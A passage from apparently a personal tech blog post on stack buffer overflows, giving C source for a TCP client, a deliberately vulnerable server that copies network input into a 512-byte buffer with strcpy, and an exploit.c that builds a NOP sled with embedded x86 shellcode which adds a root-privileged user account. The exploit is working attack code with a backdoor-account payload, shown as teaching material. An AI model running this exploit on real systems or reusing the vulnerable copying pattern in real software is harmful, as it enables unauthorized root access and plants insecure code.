    printf("%s", buff);
    fflush(stdout);
    */</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h2 id="example-for-a-server-with-a-buffer-overflow-vulnerability">Example for a Server with a Buffer Overflow Vulnerability</h2> <h3 id="clientc">client.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>

<span class="cp">#define PORT 7777
#define BUF_SIZE 1024
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">sock</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">r</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">hp</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"usage: client &lt;hostname&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* create socket */</span>
	<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">sock</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"open stream socket"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>

	<span class="cm">/* get internet address of host specified by command line */</span>
	<span class="n">hp</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s unknown host.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* copies the internet address to server address */</span>
	<span class="n">bcopy</span><span class="p">(</span><span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>

	<span class="cm">/* set port */</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

	<span class="cm">/* open connection */</span>
	<span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"connecting stream socket"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* read input from stdin */</span>
	<span class="k">while</span><span class="p">(</span><span class="n">run</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">BUF_SIZE</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="n">run</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">perror</span><span class="p">(</span><span class="s">"error reading from stdin"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="cm">/* write buffer to stream socket */</span>
		<span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">run</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">perror</span><span class="p">(</span><span class="s">"writing on stream socket"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <h3 id="serverc">server.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define LISTENQ 1024
#define SA struct sockaddr
#define PORT 7777
</span>
<span class="kt">void</span> <span class="nf">fc</span><span class="p">()</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
	<span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">1024</span><span class="p">],</span> <span class="n">ed</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">listenfd</span><span class="p">,</span> <span class="n">connfd</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serveraddr</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">n</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">calc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

	<span class="n">listenfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span> <span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

	<span class="n">bind</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>

	<span class="n">listen</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="n">LISTENQ</span><span class="p">);</span>
	<span class="k">for</span><span class="p">(</span> <span class="p">;</span> <span class="p">;)</span> <span class="p">{</span>

		<span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

		<span class="k">do</span> <span class="p">{</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Eingabe:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
			<span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
			<span class="n">text</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

			<span class="n">calc</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Gedreht:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">));</span>

			<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">%d</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
			<span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'!'</span><span class="p">);</span>

		<span class="n">close</span><span class="p">(</span><span class="n">connfd</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h3 id="exploitc">exploit.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEFAULT_OFFSET  500
#define DEFAULT_BUFFER  600
#define NOP             0x90
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xeb\x67\x5e\x89\x76\x4c\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x12\x89\x46\x50\x8d\x46\x15\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x54\x8d\x46\x17\x89\x46\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x46\x1a\x89\x46\x5c\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x1d\x89\x46\x60\x8d\x46\x22\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x64\x8d\x46\x25\x89\x46\x68</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x46\x48\x89\x46\x6c\x31\xc0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x11\x88\x46\x14\x88\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x16\x88\x46\x19\x88\x46\x1c\x88</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x21\x88\x46\x24\x88\x46\x47</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x4b\x89\x46\x70\xb0\x0b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x89\xf3\x8d\x4e\x4c\x8d\x56\x70</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x80\xe8\x94\xff\xff\xff\x2f\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x72\x2f\x73\x62\x69\x6e\x2f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x64\x64\x75\x73\x65\x72\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x75\x23\x30\x23\x2d\x6f\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x67\x23\x72\x6f\x6f\x74\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x70\x23\x24\x31\x24\x37\xcf</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x76\xd9\x4c\x4b\xcf\xb5\x24\x67</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x53\x55\x4b\x47\x36\x52\x41\x4c</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x7a\x52\x41\x38\x72\x79\x52\x4f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x63\x54\x73\x47\x30\x23\x72\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x74\x23</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">bb</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">buffs</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>    <span class="c1">// Reserve memory on the heap</span>

    <span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
    <span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="n">tmp</span><span class="p">;</span>

    <span class="c1">// Fill the entire buffer with the guessed address</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">buffs</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>

    <span class="c1">// Fill the first half with NOPs</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">buffs</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="cm">/*calc(buff);*/</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://medium.com/@al-folio/displaying-external-posts-on-your-al-folio-blog-b60a1d241a0a?source=rss-17feae71c3c4------2" target="_blank" rel="external nofollow noopener">Displaying External Posts on Your al-folio Blog</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/visualizing-high-dimensional-data-with-parallel-coordinates/">Visualizing High-Dimensional Data Using Parallel Coordinates</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/gaussian-distribution-with-a-diagonal-covariance-matrix/">Short Notes: The Multivariate Gaussian Distribution With a Diagonal Covariance Matrix</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/connect-4-introduction-and-tree-search-algorithms/">Building Intelligent Agents for Connect-4: First Steps</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/sampling-with-replacement-random-forest/">Understanding Bootstrap Sampling: Where Euler’s Number Meets Random Forests</a> </li> <div id="giscus_thread" style="max-width: 1000px; margin: 0 auto;"> <br> <script>
      let giscusTheme = determineComputedTheme();
      let giscusAttributes = {
        src: 'https://giscus.app/client.js',
        'data-repo': 'MarkusThill/MarkusThill.github.io',
        'data-repo-id': 'R_kgDOLnMaxQ',
        'data-category': 'General',
        'data-category-id': 'DIC_kwDOLnMaxc4CeUxG',
        'data-mapping': 'title',
        'data-strict': '1',
        'data-reactions-enabled': '1',
        'data-emit-metadata': '0',
        'data-input-position': 'bottom',
        'data-theme': giscusTheme,
        'data-lang': 'en',
        crossorigin: 'anonymous',
        async: '',
      };

      let giscusScript = document.createElement('script');
      Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value));
      document.getElementById('giscus_thread').appendChild(giscusScript);
    </script> <noscript>Please enable JavaScript to view the <a href="http://giscus.app/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by giscus.</a> </noscript> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Markus Thill. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a> and from <a href="https://www.freepik.com/" rel="external nofollow noopener" target="_blank">Freepik</a>. Last updated: August 01, 2025. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?6bab9ec621eb188fdd3221e1f3861398"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/img-comparison-slider@8.0.6/dist/index.min.js" integrity="sha256-EXHg3x1K4oIWdyohPeKX2ZS++Wxt/FRPH7Nl01nat1o=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/swiper@11.0.5/swiper-element-bundle.min.js" integrity="sha256-BPrwikijIybg9OQC5SYFFqhBjERYOn97tCureFgYH1E=" crossorigin="anonymous"></script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>